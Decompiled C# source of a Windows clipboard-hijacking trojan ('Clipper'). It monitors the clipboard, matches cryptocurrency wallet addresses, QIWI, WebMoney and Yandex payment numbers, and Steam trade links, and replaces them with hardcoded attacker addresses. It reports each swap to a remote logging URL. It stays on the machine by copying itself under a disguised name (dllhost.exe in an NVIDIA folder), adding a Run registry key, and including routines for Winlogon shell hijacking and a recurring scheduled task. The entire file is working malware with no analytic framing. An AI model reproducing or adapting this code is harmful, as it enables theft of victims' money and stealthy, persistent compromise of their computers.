using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace Clipper
{
	// Token: 0x02000002 RID: 2
	internal class Program
	{
		// Token: 0x06000001 RID: 1 RVA: 0x00002120 File Offset: 0x00002120
		private static string Base64InText(string iTestBase64)
		{
			byte[] bytes = Convert.FromBase64String(iTestBase64);
			return Encoding.UTF8.GetString(bytes);
		}

		// Token: 0x06000002 RID: 2 RVA: 0x00002140 File Offset: 0x00002140
		private static void Checker(Program.Clipform format, object data)
		{
			try
			{
				string text = Clipboard.GetText();
				Regex regex = new Regex("^((8|\\+7|\\+380|\\+375|\\+373)[\\- ]?)?(\\(?\\d{3}\\)?[\\- ]?)?[\\d\\- ]{7,10}$");
				Regex regex2 = new Regex("(^(1|3)(?=.*[0-9])(?=.*[a-zA-Z])[\\da-zA-Z]{27,34}?[\\d\\- ])|(^(1|3)(?=.*[0-9])(?=.*[a-zA-Z])[\\da-zA-Z]{27,34})$");
				Regex regex3 = new Regex("(^L[A-Za-z0-9]{32,34}?[\\d\\- ])|(^L[A-Za-z0-9]{32,34})$");
				Regex regex4 = new Regex("(^q[A-Za-z0-9\\:]{32,54}?[\\d\\- ])|(^q[A-Za-z0-9\\:]{32,54})$");
				Regex regex5 = new Regex("^(P|p){1}[0-9]?[\\d\\- ]{7,15}|.+@.+\\..+$");
				Regex regex6 = new Regex("(^0x[A-Za-z0-9]{40,40}?[\\d\\- ])|(^0x[A-Za-z0-9]{40,40})$");
				Regex regex7 = new Regex("(^X[A-Za-z0-9]{32,34}?[\\d\\- ])|(^X[A-Za-z0-9]{32,34})$");
				Regex regex8 = new Regex("^41001[0-9]?[\\d\\- ]{7,11}$");
				Regex regex9 = new Regex("^R[0-9]?[\\d\\- ]{12,13}$");
				Regex regex10 = new Regex("^Z[0-9]?[\\d\\- ]{12,13}$");
				Regex regex11 = new Regex("(^(GD|GC)[A-Z0-9]{54,56}?[\\d\\- ])|(^(GD|GC)[A-Z0-9]{54,56})$");
				Regex regex12 = new Regex("(^A[A-Za-z0-9]{32,34}?[\\d\\- ])|(^A[A-Za-z0-9]{32,34})$");
				Regex regex13 = new Regex("(^t[A-Za-z0-9]{32,36}?[\\d\\- ])|(^t[A-Za-z0-9]{32,36})$");
				Regex regex14 = new Regex("(^r[A-Za-z0-9]{32,34}?[\\d\\- ])|(^r[A-Za-z0-9]{32,34})$");
				Regex regex15 = new Regex("(^G[A-Za-z0-9]{32,35}?[\\d\\- ])|(^G[A-Za-z0-9]{32,35})$");
				Regex regex16 = new Regex("(^D[A-Za-z0-9]{32,35}?[\\d\\- ])|(^D[A-Za-z0-9]{32,35})$");
				Regex regex17 = new Regex("(^(T[A-Z])[A-Za-z0-9]{32,35}?[\\d\\- ])|(^(T[A-Z])[A-Za-z0-9]{32,35})$");
				if (Program.QIWI != null && regex.IsMatch(text))
				{
					Clipboard.SetText(Program.QIWI);
					Program.Logger(Program.IP2, "Replace");
				}
				if (Program.BTC != null && regex2.IsMatch(text))
				{
					Clipboard.SetText(Program.BTC);
					Program.Logger(Program.IP2, "Replace");
				}
				if (Program.LTC != null && regex3.IsMatch(text))
				{
					Clipboard.SetText(Program.LTC);
					Program.Logger(Program.IP2, "Replace");
				}
				if (Program.BCH != null && regex4.IsMatch(text))
				{
					Clipboard.SetText(Program.BCH);
					Program.Logger(Program.IP2, "Replace");
				}
				if (Program.PAY != null && (text.StartsWith("P") || (text.StartsWith("p") && text.Length == 9 && regex5.IsMatch(text))))
				{
					Clipboard.SetText(Program.PAY);
					Program.Logger(Program.IP2, "Replace");
				}
				if (Program.ETHEREUM != null && regex6.IsMatch(text))
				{
					Clipboard.SetText(Program.ETHEREUM);
					Program.Logger(Program.IP2, "Replace");
				}
				if (Program.DASH != null && regex7.IsMatch(text))
				{
					Clipboard.SetText(Program.DASH);
					Program.Logger(Program.IP2, "Replace");
				}
				if (Program.YANDEX_MONEY != null && regex8.IsMatch(text))
				{
					Clipboard.SetText(Program.YANDEX_MONEY);
					Program.Logger(Program.IP2, "Replace");
				}
				if (Program.WMR != null && regex9.IsMatch(text))
				{
					Clipboard.SetText(Program.WMR);
					Program.Logger(Program.IP2, "Replace");
				}
				if (Program.WMZ != null && regex10.IsMatch(text))
				{
					Clipboard.SetText(Program.WMZ);
					Program.Logger(Program.IP2, "Replace");
				}
				if (Program.XLM != null && regex11.IsMatch(text))
				{
					Clipboard.SetText(Program.XLM);
					Program.Logger(Program.IP2, "Replace");
				}
				if (Program.NEO != null && regex12.IsMatch(text))
				{
					Clipboard.SetText(Program.NEO);
					Program.Logger(Program.IP2, "Replace");
				}
				if (Program.ZCASH != null && regex13.IsMatch(text))
				{
					Clipboard.SetText(Program.ZCASH);
					Program.Logger(Program.IP2, "Replace");
				}
				if (Program.XPR != null && regex14.IsMatch(text))
				{
					Clipboard.SetText(Program.XPR);
					Program.Logger(Program.IP2, "Replace");
				}
				if (Program.BTG != null && regex15.IsMatch(text))
				{
					Clipboard.SetText(Program.BTG);
					Program.Logger(Program.IP2, "Replace");
				}
				if (Program.DOGE != null && regex16.IsMatch(text))
				{
					Clipboard.SetText(Program.DOGE);
					Program.Logger(Program.IP2, "Replace");
				}
				if (Program.TRX != null && regex17.IsMatch(text))
				{
					Clipboard.SetText(Program.TRX);
					Program.Logger(Program.IP2, "Replace");
				}
				if (Program.STEAMTRADE_LINK != null && text.StartsWith("https://steamcommunity.com/tradeoffer/new/?partner"))
				{
					Clipboard.SetText(Program.STEAMTRADE_LINK);
					Program.Logger(Program.IP2, "Replace");
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000003 RID: 3 RVA: 0x00002568 File Offset: 0x00002568
		private static void Main(string[] args)
		{
			try
			{
				if (!Program.InstanceCheck())
				{
					Environment.Exit(0);
				}
				Program.Copy();
				Program.Auto();
				Program.Logger("https://www.google.com");
				Program.ClipMon.OnClipboardChange += Program.Checker;
				Program.ClipMon.Start();
			}
			catch
			{
			}
		}

		// Token: 0x06000004 RID: 4 RVA: 0x000025C4 File Offset: 0x000025C4
		private static bool InstanceCheck()
		{
			bool result;
			Program.InstanceCheckMutex = new Mutex(true, "UNIC_KEY", ref result);
			return result;
		}

		// Token: 0x06000005 RID: 5 RVA: 0x000025E4 File Offset: 0x000025E4
		private static void Auto()
		{
			using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true))
			{
				registryKey.SetValue("Steam", Program.dir + "\\" + Program.file);
			}
		}

		// Token: 0x06000006 RID: 6 RVA: 0x00002640 File Offset: 0x00002640
		public static void Copy()
		{
			try
			{
				if (!Directory.Exists(Program.dir))
				{
					Directory.CreateDirectory(Program.dir);
				}
				if (!File.Exists(Program.dir + "\\" + Program.file))
				{
					File.Copy(Assembly.GetExecutingAssembly().Location, Program.dir + "\\" + Program.file);
				}
			}
			catch
			{
			}
		}

		// Token: 0x06000007 RID: 7 RVA: 0x000026B8 File Offset: 0x000026B8
		public static void Logger(string link)
		{
			WebRequest webRequest = WebRequest.Create(link);
			webRequest.Credentials = CredentialCache.DefaultCredentials;
			((HttpWebRequest)webRequest).UserAgent = "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0";
			webRequest.GetResponse();
		}

		// Token: 0x06000008 RID: 8 RVA: 0x000026F0 File Offset: 0x000026F0
		public static void AntiKill()
		{
			Process.Start(new ProcessStartInfo
			{
				FileName = "schtasks.exe",
				UseShellExecute = true,
				CreateNoWindow = false,
				WindowStyle = ProcessWindowStyle.Hidden,
				Arguments = "/create /sc MINUTE /mo 1 /tn \"Windows Service\" /tr \"" + Program.Full2 + "\" /f"
			});
			Process.Start(Program.Full2);
			Process.GetCurrentProcess().Kill();
		}

		// Token: 0x06000009 RID: 9 RVA: 0x0000275C File Offset: 0x0000275C
		public static void StartUp()
		{
			RegistryKey registryKey = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon");
			registryKey.SetValue("Shell", "explorer.exe, " + Program.Full2);
			try
			{
				RegistryKey registryKey2 = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", true);
				registryKey2.SetValue("Shell", "explorer.exe, " + Program.Full2);
			}
			catch
			{
			}
		}

		// Token: 0x0600000A RID: 10 RVA: 0x000027D4 File Offset: 0x000027D4
		public static string Logger(string adr, string res)
		{
			string result = "false";
			try
			{
				HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(adr);
				httpWebRequest.Headers.Add("Accept-Language: ru-RU,ru;q=0.8,en-US;q=0.5,en;q=0.3");
				httpWebRequest.UserAgent = "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0";
				HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
				using (StreamReader streamReader = new StreamReader(httpWebResponse.GetResponseStream(), Encoding.UTF8))
				{
					string a = streamReader.ReadToEnd();
					if (a != "" || a != string.Empty)
					{
						return result = "true";
					}
				}
			}
			catch (Exception)
			{
				return result = "false";
			}
			return result;
		}

		// Token: 0x04000001 RID: 1
		public static string dir = Environment.GetEnvironmentVariable("AppData") + "\\NVIDIA";

		// Token: 0x04000002 RID: 2
		public static string file = "dllhost.exe";

		// Token: 0x04000003 RID: 3
		private static Mutex InstanceCheckMutex;

		// Token: 0x04000004 RID: 4
		public static string curent = Process.GetCurrentProcess().MainModule.FileName.Split(new char[]
		{
			'\\'
		})[Process.GetCurrentProcess().MainModule.FileName.Split(new char[]
		{
			'\\'
		}).Length - 1];

		// Token: 0x04000005 RID: 5
		public static string Full = Environment.GetEnvironmentVariable("USERPROFILE") + "\\" + Program.curent;

		// Token: 0x04000006 RID: 6
		public static string Full2 = Environment.GetEnvironmentVariable("USERPROFILE") + "\\WinService.exe";

		// Token: 0x04000007 RID: 7
		private static string Startu = "[StartUp]";

		// Token: 0x04000008 RID: 8
		private static string Kill = "[Kill]";

		// Token: 0x04000009 RID: 9
		private static string IP = "";

		// Token: 0x0400000A RID: 10
		private static string IP2 = "";

		// Token: 0x0400000B RID: 11
		private static string YANDEX_MONEY = "";

		// Token: 0x0400000C RID: 12
		private static string WMZ = "Z536290003113";

		// Token: 0x0400000D RID: 13
		private static string WMR = "R206360871510";

		// Token: 0x0400000E RID: 14
		private static string STEAMTRADE_LINK = "steamcommunity.com/tradeoffer/new/?partner=939046325&token=VGiDo5no";

		// Token: 0x0400000F RID: 15
		private static string QIWI = "79170514676";

		// Token: 0x04000010 RID: 16
		private static string ETHEREUM = "0x024b53dbe928A393Cfa98ac2DE5C8481cAde6663";

		// Token: 0x04000011 RID: 17
		private static string ZCASH = "t1KJvDfEH6hnukSS1f2vFGLM4EXyNgjfidn";

		// Token: 0x04000012 RID: 18
		private static string XPR = "";

		// Token: 0x04000013 RID: 19
		private static string BCH = "";

		// Token: 0x04000014 RID: 20
		private static string BTG = "GdqeBidY2cBQZocZLWpMxjT9acCanYgt15";

		// Token: 0x04000015 RID: 21
		private static string DASH = "Xjh3WMJhNrUBWjU9YyEWn56rzQSrYbAf7L";

		// Token: 0x04000016 RID: 22
		private static string DOGE = "DGnQdoUqcD26K8AirAkqkRJaSR5Aov8QpT";

		// Token: 0x04000017 RID: 23
		private static string LTC = "LUTZF3FzqgT655mLwrwNNJZZAVPs3fjUqE";

		// Token: 0x04000018 RID: 24
		private static string NEO = "";

		// Token: 0x04000019 RID: 25
		private static string XLM = "GAO2E6QDPZEDUZ2CZIS2E3BJN26LRCBZ7GK5NQK3KHGHQGNVLPD4COZ2";

		// Token: 0x0400001A RID: 26
		private static string PAY = "";

		// Token: 0x0400001B RID: 27
		private static string TRX = "";

		// Token: 0x0400001C RID: 28
		private static string AntiVM = "[antivm]";

		// Token: 0x0400001D RID: 29
		public static string Get = "Xjh3WMJhNrUBWjU9YyEWn56rzQSrYbAf7L";

		// Token: 0x0400001E RID: 30
		private static string BTC = "1G5xZnXgfEJrDPEXZ5oebry3Wqgc29Uiia";

		// Token: 0x0400001F RID: 31
		private static List<string> Letters = new List<string>
		{
			"a",
			"b",
			"c",
			"d",
			"e",
			"f",
			"g",
			"h",
			"i",
			"j",
			"k",
			"l",
			"m",
			"n",
			"o",
			"p",
			"q",
			"r",
			"s",
			"t",
			"u",
			"v",
			"w",
			"x",
			"y",
			"z",
			"A",
			"B",
			"C",
			"D",
			"E",
			"F",
			"G",
			"H",
			"I",
			"J",
			"K",
			"L",
			"M",
			"N",
			"O",
			"P",
			"Q",
			"R",
			"S",
			"T",
			"U",
			"V",
			"W",
			"X",
			"Y",
			"Z"
		};

		// Token: 0x04000020 RID: 32
		private static List<string> Nums = new List<string>
		{
			"0",
			"1",
			"2",
			"3",
			"4",
			"5",
			"6",
			"7",
			"8",
			"9",
			"0"
		};

		// Token: 0x02000003 RID: 3
		public static class ClipMon
		{
			// Token: 0x14000001 RID: 1
			// (add) Token: 0x0600000D RID: 13 RVA: 0x00002D04 File Offset: 0x00002D04
			// (remove) Token: 0x0600000E RID: 14 RVA: 0x00002D38 File Offset: 0x00002D38
			public static event Program.ClipMon.OnClipboardChangeEventHandler OnClipboardChange;

			// Token: 0x0600000F RID: 15 RVA: 0x00002058 File Offset: 0x00002058
			public static void Start()
			{
				Program.ClipMon.Clipwatch.Start();
				Program.ClipMon.Clipwatch.OnClipboardChange += delegate(Program.Clipform format, object data)
				{
					Program.ClipMon.OnClipboardChange(format, data);
				};
			}

			// Token: 0x06000010 RID: 16 RVA: 0x00002081 File Offset: 0x00002081
			public static void Stop()
			{
				Program.ClipMon.OnClipboardChange = null;
				Program.ClipMon.Clipwatch.Stop();
			}

			// Token: 0x02000004 RID: 4
			// (Invoke) Token: 0x06000013 RID: 19
			public delegate void OnClipboardChangeEventHandler(Program.Clipform format, object data);

			// Token: 0x02000005 RID: 5
			private class Clipwatch : Form
			{
				// Token: 0x14000002 RID: 2
				// (add) Token: 0x06000016 RID: 22 RVA: 0x00002D6C File Offset: 0x00002D6C
				// (remove) Token: 0x06000017 RID: 23 RVA: 0x00002DA0 File Offset: 0x00002DA0
				public static event Program.ClipMon.Clipwatch.OnClipboardChangeEventHandler OnClipboardChange;

				// Token: 0x06000018 RID: 24 RVA: 0x00002DD4 File Offset: 0x00002DD4
				public static void Start()
				{
					if (Program.ClipMon.Clipwatch.mInstance != null)
					{
						return;
					}
					Thread thread = new Thread(delegate(object x)
					{
						Application.Run(new Program.ClipMon.Clipwatch());
					});
					thread.SetApartmentState(ApartmentState.STA);
					thread.Start();
				}

				// Token: 0x06000019 RID: 25 RVA: 0x00002E1C File Offset: 0x00002E1C
				public static void Stop()
				{
					Program.ClipMon.Clipwatch.mInstance.Invoke(new MethodInvoker(delegate()
					{
						Program.ClipMon.Clipwatch.ChangeClipboardChain(Program.ClipMon.Clipwatch.mInstance.Handle, Program.ClipMon.Clipwatch.nextClipboardViewer);
					}));
					Program.ClipMon.Clipwatch.mInstance.Invoke(new MethodInvoker(Program.ClipMon.Clipwatch.mInstance.Close));
					Program.ClipMon.Clipwatch.mInstance.Dispose();
					Program.ClipMon.Clipwatch.mInstance = null;
				}

				// Token: 0x0600001A RID: 26 RVA: 0x0000209C File Offset: 0x0000209C
				protected override void SetVisibleCore(bool value)
				{
					this.CreateHandle();
					Program.ClipMon.Clipwatch.mInstance = this;
					Program.ClipMon.Clipwatch.nextClipboardViewer = Program.ClipMon.Clipwatch.SetClipboardViewer(Program.ClipMon.Clipwatch.mInstance.Handle);
					base.SetVisibleCore(false);
				}

				// Token: 0x0600001B RID: 27
				[DllImport("User32.dll", CharSet = CharSet.Auto)]
				private static extern IntPtr SetClipboardViewer(IntPtr hWndNewViewer);

				// Token: 0x0600001C RID: 28
				[DllImport("User32.dll", CharSet = CharSet.Auto)]
				private static extern bool ChangeClipboardChain(IntPtr hWndRemove, IntPtr hWndNewNext);

				// Token: 0x0600001D RID: 29
				[DllImport("user32.dll", CharSet = CharSet.Auto)]
				private static extern int SendMessage(IntPtr hwnd, int wMsg, IntPtr wParam, IntPtr lParam);

				// Token: 0x0600001E RID: 30 RVA: 0x00002E7C File Offset: 0x00002E7C
				protected override void WndProc(ref Message m)
				{
					int msg = m.Msg;
					if (msg == 776)
					{
						this.ClipChang();
						Program.ClipMon.Clipwatch.SendMessage(Program.ClipMon.Clipwatch.nextClipboardViewer, m.Msg, m.WParam, m.LParam);
						return;
					}
					if (msg != 781)
					{
						base.WndProc(ref m);
						return;
					}
					if (m.WParam == Program.ClipMon.Clipwatch.nextClipboardViewer)
					{
						Program.ClipMon.Clipwatch.nextClipboardViewer = m.LParam;
						return;
					}
					Program.ClipMon.Clipwatch.SendMessage(Program.ClipMon.Clipwatch.nextClipboardViewer, m.Msg, m.WParam, m.LParam);
				}

				// Token: 0x0600001F RID: 31 RVA: 0x00002F08 File Offset: 0x00002F08
				private void ClipChang()
				{
					IDataObject dataObject = Clipboard.GetDataObject();
					Program.Clipform? clipform = null;
					foreach (string text in Program.ClipMon.Clipwatch.formats)
					{
						if (dataObject.GetDataPresent(text))
						{
							clipform = new Program.Clipform?((Program.Clipform)Enum.Parse(typeof(Program.Clipform), text));
							break;
						}
					}
					object data = dataObject.GetData(clipform.ToString());
					if (data == null || clipform == null)
					{
						return;
					}
					Program.ClipMon.Clipwatch.OnClipboardChange(clipform.Value, data);
				}

				// Token: 0x04000023 RID: 35
				private const int WM_DRAWCLIPBOARD = 776;

				// Token: 0x04000024 RID: 36
				private const int WM_CHANGECBCHAIN = 781;

				// Token: 0x04000026 RID: 38
				private static Program.ClipMon.Clipwatch mInstance;

				// Token: 0x04000027 RID: 39
				private static IntPtr nextClipboardViewer;

				// Token: 0x04000028 RID: 40
				private static readonly string[] formats = Enum.GetNames(typeof(Program.Clipform));

				// Token: 0x02000006 RID: 6
				// (Invoke) Token: 0x06000025 RID: 37
				public delegate void OnClipboardChangeEventHandler(Program.Clipform format, object data);
			}
		}

		// Token: 0x02000007 RID: 7
		public enum Clipform : byte
		{
			// Token: 0x0400002C RID: 44
			Text,
			// Token: 0x0400002D RID: 45
			UnicodeText,
			// Token: 0x0400002E RID: 46
			Dib,
			// Token: 0x0400002F RID: 47
			Bitmap,
			// Token: 0x04000030 RID: 48
			EnhancedMetafile,
			// Token: 0x04000031 RID: 49
			MetafilePict,
			// Token: 0x04000032 RID: 50
			SymbolicLink,
			// Token: 0x04000033 RID: 51
			Dif,
			// Token: 0x04000034 RID: 52
			Tiff,
			// Token: 0x04000035 RID: 53
			OemText,
			// Token: 0x04000036 RID: 54
			Palette,
			// Token: 0x04000037 RID: 55
			PenData,
			// Token: 0x04000038 RID: 56
			Riff,
			// Token: 0x04000039 RID: 57
			WaveAudio,
			// Token: 0x0400003A RID: 58
			FileDrop,
			// Token: 0x0400003B RID: 59
			Locale,
			// Token: 0x0400003C RID: 60
			Html,
			// Token: 0x0400003D RID: 61
			Rtf,
			// Token: 0x0400003E RID: 62
			CommaSeparatedValue,
			// Token: 0x0400003F RID: 63
			StringFormat,
			// Token: 0x04000040 RID: 64
			Serializable
		}

		// Token: 0x02000008 RID: 8
		public static class GlobalPath
		{
			// Token: 0x04000041 RID: 65
			public static readonly string LocalAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);

			// Token: 0x04000042 RID: 66
			public static readonly string Filename = "Build.exe";
		}
	}
}
